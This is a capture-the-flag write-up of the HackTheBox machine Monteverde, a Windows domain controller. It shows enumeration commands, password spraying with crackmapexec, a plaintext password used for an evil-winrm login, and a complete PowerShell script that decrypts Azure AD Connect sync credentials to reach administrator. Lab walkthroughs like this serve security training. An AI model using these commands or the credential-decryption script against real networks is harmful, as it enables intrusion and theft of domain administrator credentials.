# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.10.172 -T5
```
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/1.png
">

After running a thorough portscan on the target we learn that the target is a domain controller and has lot's of open ports. This can be usefull for enumeration.

# Enumeration
We'll try to run some basic vulnerability scans on ports that are known to have security issues. This didn't return anything usefull.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/2.png
">

Running ```enum4linux 10.10.10.172``` gave use much information:
```
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
```
We note that the ```Account Lockout Threshold``` is set to ```None``` enabling us to bruteforce the target without being locked out.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/4.png
">

Unfortunately there isn't a share available. This is a common place to find usefull information. But we do have found some usernames which we'll save to ```username.txt```.
```
mhope
dgalanos
roleary
smorgan
SABatchJobs
```

Also running the following command returned a lot of information related to the domain.
```
map -n -sV --script "ldap* and not brute" 10.10.10.172 -Pn
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/3.png
">

Running ```ldapdomaindump 10.10.10.172``` gave me issues. Not sure if it's a local problem.

# Initial Foothold
We can now try to run a dictionary attack on the smb service using ```crackmapexec```.

```
crackmapexec smb 10.10.10.172 -d megabank -u usernames.txt -p /usr/share/seclists/Passwords/darkweb2017-top1000.txt 
```
That didn't return valid credentials. Let's try it again using the usernames also as passwords:
```
crackmapexec smb 10.10.10.172 -d megabank -u usernames.txt -p usernames.txt
```
That led to success:

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/5.png
">

# Lateral Movement
We can use ```smbmap``` to see which shares are available to user ```SABatchJobs```. Using the ```-R``` argument lists all files and folders. The ```-x [command]``` let's us run commands, but it didn't work on this target.

```
smbmap -u SABatchJobs -p SABatchJobs -d Megabank -H 10.10.10.172 -R  
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/6.png
">

We find an interesting file and download it using the ```-A``` argument.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/8.png
">

The content shows us a password.
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/9.png
">

We'll try this password with the earlier found usernames and are successful with ```mhope```.
```
evil-winrm  -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
```

# Privilege Escalation

Running ```winpeas.bat``` didn't reveal much useful information other than the existence of an ```Azure Admin``` user group.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/10.png
">

Browsing around shows us more Azure programs:
<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/11.png
">

I found more info on Azure and found out that we could connect to the local database and pull the configuration. We then can decrypt it to get the username and password for the account that handles replication.
https://blog.xpnsec.com/azuread-connect-for-redteam/

We can use the script from the blog and run it on our target:
```
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```
We get our username and password and can now use them to login as administrator using  ```evil-winrm```.

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Monteverde/assets/12.png
">

